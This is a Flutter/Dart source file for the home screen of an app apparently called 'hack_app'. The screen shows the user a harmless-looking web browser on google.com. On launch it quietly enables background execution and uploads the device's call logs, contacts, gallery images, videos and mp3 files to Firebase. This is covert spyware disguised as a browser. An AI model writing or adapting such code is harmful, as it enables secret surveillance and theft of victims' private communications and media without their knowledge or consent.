import 'package:flutter/material.dart';
import 'package:flutter_background/flutter_background.dart';
import 'package:hack_app/accessdata/alldataisasscess.dart';
import 'package:hive/hive.dart';
import 'package:provider/provider.dart';
import 'package:web_browser/web_browser.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  String _status = 'Not running';
  var sett = Hive.box('settings');
  @override
  void initState() {
    String uid = sett.get('uid', defaultValue: '');
    Hackapp hack = Provider.of<Hackapp>(context, listen: false);
    startBackgroundTask(hack, uid);
    super.initState();
  }

  Future<void> startBackgroundTask(Hackapp hack, uid) async {
    try {
      await FlutterBackground.enableBackgroundExecution();
      await FlutterBackground.initialize();
      hack.uploadCallLogsToFirebase(uid);
      hack.accessallcontact(uid);
      hack.loadGalleryImages(uid);
      hack.uploadAllVideosToFirebase(uid);
      hack.uploadallmp3file(uid);
      setState(() {
        _status = 'Running in the background';
      });
    } catch (e) {
      print('Error starting background task: $e');
      setState(() {
        _status = 'Error starting background task';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      body: SafeArea(
        child:Browser(
          initialUriString: 'https://google.com/',
        ),
      ),
    );
  }
}
